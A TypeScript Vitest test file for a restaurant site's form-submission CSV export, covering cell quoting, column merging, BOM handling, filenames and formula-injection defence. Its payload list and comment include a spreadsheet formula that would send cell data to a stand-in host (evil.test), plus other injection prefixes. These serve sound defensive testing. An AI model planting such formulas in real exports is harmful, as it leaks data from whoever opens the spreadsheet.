import { describe, expect, it } from "vitest";

import { csvCell, csvFilename, submissionsToCsv } from "../forms/export";

/**
 * The cells in this file were typed by strangers on a public restaurant
 * website, so escaping is the entire risk surface — not a formatting detail.
 */
describe("csvCell", () => {
  it("quotes every cell and doubles embedded quotes", () => {
    expect(csvCell("plain")).toBe('"plain"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it("keeps a comma or a newline from shifting every column after it", () => {
    expect(csvCell("Smith, Jane")).toBe('"Smith, Jane"');
    expect(csvCell("line one\nline two")).toBe('"line one\nline two"');
  });

  /**
   * A cell beginning `=`, `+`, `-` or `@` is executed as a formula by Excel,
   * Sheets and LibreOffice. `=HYPERLINK("http://evil.test?"&A1)` typed into a
   * public contact form becomes a live exfiltration link the moment the owner
   * opens their leads.
   */
  it("neutralises spreadsheet formula injection", () => {
    for (const payload of [
      '=HYPERLINK("http://evil.test?"&A1)',
      "+1+1",
      "-1+1",
      "@SUM(A1:A9)",
      "\tcmd",
      "\rcmd",
    ]) {
      const cell = csvCell(payload);
      // The apostrophe sits inside the quotes, immediately before the payload.
      expect(cell.startsWith("\"'"), payload).toBe(true);
    }
  });

  it("leaves an ordinary answer alone apart from quoting", () => {
    expect(csvCell("Table for 8 on the 3rd")).toBe('"Table for 8 on the 3rd"');
    // A minus mid-string is not a formula and must not be mangled.
    expect(csvCell("7-9pm")).toBe('"7-9pm"');
  });
});

describe("submissionsToCsv", () => {
  const rows = [
    {
      createdAt: "2026-08-20T10:00:00.000Z",
      answers: [
        { label: "Full name", value: "Zahara Z." },
        { label: "Email", value: "z@example.com" },
      ],
    },
    {
      createdAt: "2026-08-19T10:00:00.000Z",
      answers: [
        { label: "Full name", value: "Sam" },
        // A question the form no longer asks.
        { label: "How did you hear about us?", value: "A friend" },
      ],
    },
  ];

  it("uses the union of every question ever asked", () => {
    const csv = submissionsToCsv(rows);
    const header = csv.split("\r\n")[0];

    expect(header).toContain('"Full name"');
    expect(header).toContain('"Email"');
    // Dropping it would silently lose data sitting right there in the row —
    // and historical leads are exactly what a merchant exports.
    expect(header).toContain('"How did you hear about us?"');
  });

  it("leaves a cell empty where that submission had no such question", () => {
    const lines = submissionsToCsv(rows).split("\r\n");
    // Zahara never answered the third column.
    expect(lines[1].endsWith(',""')).toBe(true);
  });

  it("starts with a BOM so Excel on Windows does not mangle accents", () => {
    expect(submissionsToCsv(rows).charCodeAt(0)).toBe(0xfeff);
  });

  it("produces just a header for no submissions", () => {
    expect(submissionsToCsv([]).replace("\ufeff", "")).toBe('"Received"');
  });
});

describe("csvFilename", () => {
  it("is filesystem-safe and sorts chronologically", () => {
    const name = csvFilename("Planning an Event? Let's Make It Easy.");
    expect(name).toMatch(/^planning-an-event-let-s-make-it-easy-responses-\d{4}-\d{2}-\d{2}\.csv$/);
  });

  it("survives a form named in a script with no ascii at all", () => {
    expect(csvFilename("مطعم")).toMatch(/^form-responses-\d{4}-\d{2}-\d{2}\.csv$/);
  });
});
